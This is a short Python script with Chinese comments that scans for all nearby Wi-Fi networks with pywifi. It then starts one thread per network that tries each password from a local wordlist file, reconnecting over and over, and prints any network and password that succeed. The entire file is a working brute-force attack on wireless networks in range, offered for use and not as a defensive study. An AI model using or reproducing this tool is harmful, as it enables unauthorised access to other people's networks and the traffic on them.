#测试链接
import pywifi,time,platform,threading,logging
from pywifi import const

pywifi.set_loglevel()
def go_scan():
    wifi=pywifi.PyWiFi()#初始化
    iface=wifi.interfaces()[0]#第一个无线网卡
    iface.scan()#扫描
    time.sleep(2)
    bsses=iface.scan_results()#扫描结果
    print("WiFi扫描结束")
    return bsses

def go_interfaces():
    wifi=pywifi.PyWiFi()
    assert wifi.interfaces()#抓取网卡接口
    if platform.system().lower()=='windows':#判断平台
        assert wifi.interfaces()[0].name()=='####'#自己网络的接口
    print("无线网卡测试完成")

class testwifi(threading.Thread):
    def __init__(self,wifiname,password):
        threading.Thread.__init__(self)
        self.wifiname=wifiname
        self.password=password

    def run(self):
        wifi=pywifi.PyWiFi()
        iface=wifi.interfaces()[0]
        iface.disconnect()#断开所有的无线连接
        time.sleep(1)
        profile=pywifi.Profile()#构造profile
        profile.ssid=self.wifiname #wifi名
        profile.auth=const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#默认的加密算法
        profile.cipher=const.CIPHER_TYPE_CCMP#WiFi的数据类型
        for k in self.password:
            profile.key=k   #wifi密码
            try:
                iface.remove_all_network_profiles() #卸载当前网络的所有WiFi
                tmp_profile=iface.add_network_profile(profile) #增加一个profile用于登陆wifi
                iface.connect(tmp_profile) #根据profile链接wifi
                # time.sleep(1)
                if iface.status()==const.IFACE_CONNECTED:#链接上的状态
                    print('账号',self.wifiname ,'链接成功',k)
                    return
                iface.disconnect()
            except TypeError:
                pass
def getpassword():
    path=r'F:\52G葫芦娃\密码归并.txt'
    passwordlist=[]
    with open(path,'rb') as file:
        for line in file:
            linestr=line.decode("utf-8",'ignore')
            passwordlist.append(linestr)
    return  passwordlist


def main():
    threadlist=[]
    password=getpassword()
    print('密码获取完成')
    name=go_scan()
    go_interfaces()
    for wifiname in name:
        thr=testwifi(wifiname,password)
        threadlist.append(thr)
        thr.start()
    for thr in threadlist:
        thr.join()
    print("结束")


main()


